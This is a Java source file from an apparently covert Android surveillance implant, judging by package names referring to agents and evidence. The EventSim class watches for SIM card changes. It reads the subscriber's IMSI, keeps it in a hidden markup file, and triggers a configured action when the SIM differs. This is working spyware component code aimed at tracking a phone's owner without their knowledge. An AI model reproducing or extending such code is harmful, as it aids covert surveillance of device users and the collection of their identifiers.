package com.ht.RCSAndroidGUI.event;

import java.io.IOException;

import android.util.Log;

import com.ht.RCSAndroidGUI.Device;
import com.ht.RCSAndroidGUI.Sim;
import com.ht.RCSAndroidGUI.agent.AgentType;
import com.ht.RCSAndroidGUI.evidence.Markup;
import com.ht.RCSAndroidGUI.interfaces.Observer;
import com.ht.RCSAndroidGUI.listener.ListenerSim;

public class EventSim extends EventBase implements Observer<Sim> {
	/** The Constant TAG. */
	private static final String TAG = "EventSim";

	private int actionOnEnter;

	@Override
	public void begin() {
		ListenerSim.self().attach(this);
	}

	@Override
	public void end() {
		ListenerSim.self().detach(this);
	}

	@Override
	public boolean parse(EventConf event) {
		super.setEvent(event);

		actionOnEnter = event.getAction();

		return true;
	}

	@Override
	public void go() {
		// TODO Auto-generated method stub
	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Sim s) {
		Log.d("QZ", TAG + " Got SIM status notification: " + s.getImsi());

		// Verifichiamo la presenza della SIM
		if (s.getImsi().length() == 0)
			return 0;
		
		Markup storedImsi = new Markup(EventType.EVENT_SIM_CHANGE);

		// Vediamo se gia' c'e' un markup
		if (storedImsi.isMarkup() == true) {
			try {
				byte[] actual = storedImsi.readMarkup();
				String storedValue = new String(actual);
				
				if (storedValue.contentEquals(s.getImsi()) == false) {
					// Aggiorniamo il markup
					byte[] value = s.getImsi().getBytes();
					storedImsi.writeMarkup(value);
					
					onEnter();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		} else {
			String imsi = Device.self().getImsi();
			
			byte[] value = imsi.getBytes();
			
			storedImsi.writeMarkup(value);
		}
		
		storedImsi = null;
		return 0;
	}

	public void onEnter() {
		trigger(actionOnEnter);
	}
}
